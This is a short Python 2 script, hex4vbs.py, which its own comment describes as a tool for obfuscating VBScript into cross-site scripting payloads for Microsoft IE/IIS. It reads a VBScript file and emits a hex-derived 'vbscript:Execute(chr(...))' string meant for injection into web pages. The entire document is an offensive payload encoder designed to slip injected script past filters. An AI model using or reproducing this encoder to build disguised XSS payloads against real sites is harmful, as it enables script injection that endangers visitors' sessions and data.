#!/usr/bin/env python2
def E(s):# hex4vbs.py - @decalresponds 
  l,r=list(s.encode('HEX')),"vbscript:Execute(chr(20" # coded by Derek Callaway
  for i in range(len(l)): # Obfuscate VBScript for Microsoft IE/IIS XSS payloads
    if not i%2:r+=")&chr("
    r+=l[i]
  return r
import sys;s=sys
if len(s.argv)<=1:s.stderr.write("usage: "+s.argv[0]+" ascript.vbs\n")
else:print(E(open(s.argv[1]).read())+"))")
